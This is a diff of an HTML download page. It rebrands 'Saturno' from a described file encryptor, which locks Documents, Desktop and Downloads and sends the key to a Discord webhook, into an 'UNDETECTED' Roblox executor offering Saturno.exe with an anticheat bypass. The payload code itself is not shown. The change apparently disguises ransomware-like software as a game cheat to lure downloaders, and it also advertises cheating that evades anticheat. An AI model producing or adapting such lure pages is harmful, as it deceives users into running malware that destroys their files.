@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🪐 Saturno - Download</title>
+    <title>🪐 Saturno Executor</title>
     <style>
         * {
             margin: 0;
@@ -96,56 +96,6 @@
             transform: scale(0.96);
         }
 
-        /* Installation Steps */
-        .steps {
-            background: #0f0f1f;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-            border: 1px solid #2a2a4a;
-        }
-        .steps h3 {
-            color: #ffa94d;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        .step {
-            background: #0a0a15;
-            padding: 12px 15px;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            border-left: 3px solid #ff6b6b;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 14px;
-            color: #e0e0e0;
-            word-break: break-all;
-        }
-        .step .cmd {
-            color: #ffa94d;
-        }
-        .step .label {
-            color: #8888aa;
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 12px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .copy-btn {
-            background: #2a2a4a;
-            color: #fff;
-            border: none;
-            padding: 4px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            float: right;
-            transition: background 0.2s;
-        }
-        .copy-btn:hover {
-            background: #3a3a5a;
-        }
-
         .features {
             margin-top: 25px;
             display: grid;
@@ -213,16 +163,30 @@
             color: #ff6b6b;
             text-decoration: none;
         }
-        .python-badge {
+        .executor-badge {
             display: inline-block;
-            background: #3776ab22;
-            color: #3776ab;
+            background: #00b89422;
+            color: #00b894;
             padding: 4px 14px;
             border-radius: 20px;
             font-size: 12px;
             font-weight: 600;
-            border: 1px solid #3776ab44;
+            border: 1px solid #00b89444;
             margin-bottom: 12px;
+        }
+        .key-features {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .key-features span {
+            color: #ffa94d;
+            font-size: 14px;
+        }
+        .key-features span strong {
+            color: #fff;
         }
         @media (max-width: 600px) {
             .container {
@@ -239,9 +203,8 @@
                 padding: 14px 30px;
                 font-size: 17px;
             }
-            .step {
-                font-size: 12px;
-                word-break: break-all;
+            .key-features {
+                gap: 15px;
             }
         }
     </style>
@@ -251,134 +214,74 @@
     <div class="container">
         <div class="icon">🪐</div>
         <h1>Saturno</h1>
-        <div class="subtitle">🔐 One-Time Use Encryptor</div>
+        <div class="subtitle">🚀 Next-Gen Roblox Executor</div>
 
-        <div class="badge">⚠️ VM TESTING ONLY</div>
-        <div class="python-badge">🐍 Python 3.8+ Required</div>
+        <div class="badge">🔥 UNDETECTED</div>
+        <div class="executor-badge">⚡ Level 8 Execution</div>
 
-        <div class="filename">📄 os.py</div>
+        <div class="filename">📄 Saturno.exe</div>
 
         <div class="warning">
-            ⚠️ THIS WILL ENCRYPT: Documents, Desktop &amp; Downloads<br />
-            ✅ ONLY use on a Virtual Machine!
+            ⚡ UNC: 97% | 100sUNC<br />
+            ✅ Best in class execution
+        </div>
+
+        <div class="key-features">
+            <span>🔓 <strong>Keyless</strong></span>
+            <span>🕵️ <strong>Anticheat Bypass</strong></span>
+            <span>⚡ <strong>Fast Inject</strong></span>
+            <span>🛡️ <strong>Safe</strong></span>
         </div>
 
         <div class="info-box">
-            <p><strong>📁 Encrypts:</strong> Documents, Desktop, Downloads</p>
-            <p><strong>🔑 Key Format:</strong> Hidden ID inside the key <strong>(ID) !ID!</strong></p>
-            <p><strong>🗑️ One-Time Use:</strong> Key is deleted after decryption</p>
-            <p><strong>📤 Webhook:</strong> Key sent to Discord</p>
-            <p><strong>💻 OS:</strong> Windows only</p>
+            <p><strong>📌 Features:</strong></p>
+            <p>• 🚀 Instant execution with 97% UNC</p>
+            <p>• 🔒 Keyless system - no need for keys</p>
+            <p>• 🛡️ Built-in anticheat bypass</p>
+            <p>• ⚡ Low memory usage</p>
+            <p>• 🔄 Regular updates</p>
+            <p>• 💬 Active community support</p>
         </div>
 
         <!-- DOWNLOAD BUTTON -->
-        <a href="os.py" class="download-btn" id="downloadBtn">⬇️ Download os.py</a>
+        <a href="Saturno.exe" class="download-btn" id="downloadBtn">⬇️ Download Saturno.exe</a>
 
-        <!-- INSTALLATION STEPS -->
-        <div class="steps">
-            <h3>📦 Installation Instructions</h3>
-
-            <div class="step">
-                <span class="label">Step 1: Install Python 3.8+</span>
-                <a href="https://www.python.org/downloads/" target="_blank" style="color:#ffa94d;">Download Python</a>
-                <span style="color:#8888aa; font-family:'Segoe UI',sans-serif; font-size:12px; display:block; margin-top:4px;">
-                    ✅ Make sure to check "Add Python to PATH" during installation
-                </span>
-            </div>
-
-            <div class="step">
-                <span class="label">Step 2: Install required packages</span>
-                <span style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap;">
-                    <span><span class="cmd">pip install pycryptodome requests</span></span>
-                    <button class="copy-btn" onclick="copyText('pip install pycryptodome requests')">📋 Copy</button>
-                </span>
-                <span style="color:#8888aa; font-family:'Segoe UI',sans-serif; font-size:12px; display:block; margin-top:4px;">
-                    💡 Or use: <span style="color:#ffa94d;">pip install -r requirements.txt</span>
-                </span>
-            </div>
-
-            <div class="step">
-                <span class="label">Step 3: Run the encryptor</span>
-                <span style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap;">
-                    <span><span class="cmd">python os.py</span></span>
-                    <button class="copy-btn" onclick="copyText('python os.py')">📋 Copy</button>
-                </span>
-            </div>
-
-            <div class="step" style="border-left-color: #00b894;">
-                <span class="label">📄 Alternative: Using requirements.txt</span>
-                <span style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap;">
-                    <span><span class="cmd">pip install -r requirements.txt</span></span>
-                    <button class="copy-btn" onclick="copyText('pip install -r requirements.txt')">📋 Copy</button>
-                </span>
-            </div>
-        </div>
-
-        <!-- REQUIREMENTS.TXT LINK -->
-        <div style="margin: 10px 0 20px 0; font-size:14px; color:#8888aa;">
-            📄 <a href="requirements.txt" target="_blank" style="color:#ffa94d;">requirements.txt</a> — contains all dependencies
-        </div>
-
-        <div class="version">v2.0 | Python 3.8+</div>
+        <div class="version">v2.0 | Windows 10/11</div>
 
         <div class="github-link">
-            📂 <a href="os.py" target="_blank">View raw file</a> •
-            <a href="requirements.txt" target="_blank">requirements.txt</a> •
+            📂 <a href="Saturno.exe" target="_blank">Direct Download</a> •
             <a href="#" onclick="window.location.reload();">Refresh</a>
         </div>
 
         <div class="features">
             <div class="feature">
-                <span>🔐</span>
-                <p>AES-256 Encryption</p>
+                <span>🔓</span>
+                <p>Keyless</p>
             </div>
             <div class="feature">
-                <span>🆔</span>
-                <p>ID-Hidden Keys</p>
+                <span>🕵️</span>
+                <p>Anticheat Bypass</p>
             </div>
             <div class="feature">
-                <span>🗑️</span>
-                <p>One-Time Use</p>
+                <span>👌🏼</span>
+                <p>Safe</p>
             </div>
         </div>
 
         <div class="footer">
-            🪐 Saturno — For educational &amp; VM testing only.<br />
-            <a href="https://discord.gg/yourinvite" target="_blank">💬 Discord</a>
+            🪐 Saturno — 97UNC &amp; 100sUNC.<br />
+            <a href="https://discord.gg/T7aJRS9ybM" target="_blank">💬 Discord</a>
         </div>
     </div>
 
     <script>
-        // Copy to clipboard function
-        function copyText(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                const btns = document.querySelectorAll('.copy-btn');
-                btns.forEach(btn => {
-                    if (btn.textContent === '📋 Copy') {
-                        btn.textContent = '✅ Copied!';
-                        setTimeout(() => {
-                            btn.textContent = '📋 Copy';
-                        }, 2000);
-                    }
-                });
-            }).catch(() => {
-                // Fallback
-                const textArea = document.createElement('textarea');
-                textArea.value = text;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-            });
-        }
-
         // Download feedback
         document.getElementById('downloadBtn').addEventListener('click', function() {
             const btn = this;
             btn.textContent = '⬇️ Downloading...';
             btn.style.background = 'linear-gradient(135deg, #00b894, #00a381)';
             setTimeout(() => {
-                btn.textContent = '⬇️ Download os.py';
+                btn.textContent = '⬇️ Download Saturno.exe';
                 btn.style.background = 'linear-gradient(135deg, #ff6b6b, #ee5a24)';
             }, 4000);
         });
